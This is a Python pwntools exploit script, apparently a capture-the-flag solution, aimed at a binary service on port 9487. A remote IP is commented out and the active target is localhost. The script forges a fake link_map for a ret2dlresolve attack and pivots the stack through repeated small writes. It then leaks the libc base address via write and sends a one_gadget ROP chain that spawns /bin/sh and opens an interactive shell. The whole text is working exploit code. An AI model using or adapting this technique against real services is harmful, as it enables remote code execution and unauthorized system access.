from pwn import *

context.arch = 'amd64'

#io = remote('34.81.158.137', 9487)
io = remote('127.0.0.1', 9487)
libc = ELF('./libc.so.6')

main_read = 0x401024
read_got = 0x403018
call_dl_runtime_resolve = 0x401006
safe_zone = 0x403800

 # read_address + fake_l_addr = read_address + (write_offset - read_offset) = write_address
fake_l_addr = libc.sym['write'] - libc.sym['read']
fake_link_map = 0x403c00

dlresolve_payload = flat([
    # pre dlresolve rop
    # call _dl_runtime_resolve(link_map, 0)
    0,
    call_dl_runtime_resolve,
    fake_link_map,
    0,
    # read again
    main_read,
    0,

    #
    # fake link map starts here
    #
    fake_l_addr,

    # fake DT_JMPREL
    0,
    fake_link_map + 0x18, # fake .rel.plt address

    # fake .rel.plt
    fake_link_map - 0x28 - fake_l_addr, # r_offset ((fake_link_map - 0x28 - fake_l_addr) + fake_l_addr = fake_link_map - 0x28)
    0x7, # r_info must be 0x7
    0, # r_addend

    # l_ns
    0,

    # fake DT_SYMTAB
    0,
    read_got - 0x8,

    0,
    0,
    0,
    0,

    # fake DT_STRTAB address
    fake_link_map,
    # fake DT_SYMTAB address
    fake_link_map + 0x38,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    # fake DT_JMPREL address
    fake_link_map + 0x8,
    ])

# write fake link map to a writable address (0x403c00)
# We can only write 0x10 bytes at a time (0x20 - 8 byte old rbp - 8 byte ret address)

log.info('Building dlresolve payload')

for i in range(0, 0x130, 0x10):
    # write 0x10 bytes
    # remove last byte because '\0' will be added to the end
    payload = p64(fake_link_map + 0x100 - i - 0x20) + p64(main_read)[:-1]
    io.wait(0.1)
    io.send(payload)

    # in order to prevent stack collision, make rsp points to a safe area
    payload = p64(safe_zone) + p64(main_read) + dlresolve_payload[len(dlresolve_payload) - i - 0x10 : len(dlresolve_payload) - i][:-1]
    io.wait(0.1)
    io.send(payload)

# pivot to pre dlresolve rop
payload = p64(fake_link_map - 0x30) + p64(main_read)[:-1]
io.wait(0.1)
io.send(payload)

# make stack points to pre dlresolve rop
payload = p64(fake_link_map - 0x10)[:-1]
io.wait(0.1)
io.send(payload)

# trigger write function
# retrieve libc base address through write

io.recv(0x8)
libc_base = u64(io.recv(0x8)) - libc.sym['write']
io.recv(0x10)

log.info('libc base address = ' + hex(libc_base))

# one gadget!
#
# 0xe3b2e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

pop_r12_ret = libc_base + 0x2f739
one_gadget = libc_base + 0xe3b2e

shell_rop = flat([
    pop_r12_ret,
    0,
    one_gadget
    ])

log.info('Spawning shell...')

io.wait(0.1)
io.send(shell_rop)

io.interactive()
